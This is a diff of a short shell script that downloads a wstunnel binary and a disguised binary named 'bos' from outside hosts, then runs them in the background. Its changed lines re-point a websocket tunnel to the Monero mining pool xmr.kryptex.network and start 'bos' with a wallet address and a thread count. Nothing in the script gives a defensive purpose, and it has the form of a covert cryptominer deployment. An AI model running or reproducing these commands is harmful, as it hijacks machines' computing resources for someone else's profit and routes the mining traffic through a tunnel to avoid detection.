@@ -2,6 +2,6 @@ curl -L -O -J https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.t
 curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/bos
 tar -xf wstunnel_10.5.2_linux_amd64.tar.gz
 chmod +x wstunnel bos
-nohup ./wstunnel server ws://127.0.0.1:2367 &
-nohup ./wstunnel client -L tcp://127.0.0.1:3589:xmr.kryptex.network:7029 ws://127.0.0.1:2367 &
-./bos -o 127.0.0.1:3589 -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.ROT -t 7
+nohup ./wstunnel server ws://127.0.0.1:21547 &
+nohup ./wstunnel client -L tcp://127.0.0.1:23768:xmr.kryptex.network:7029 ws://127.0.0.1:21547 &
+./bos -o 127.0.0.1:23768 -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.ROT -t 4
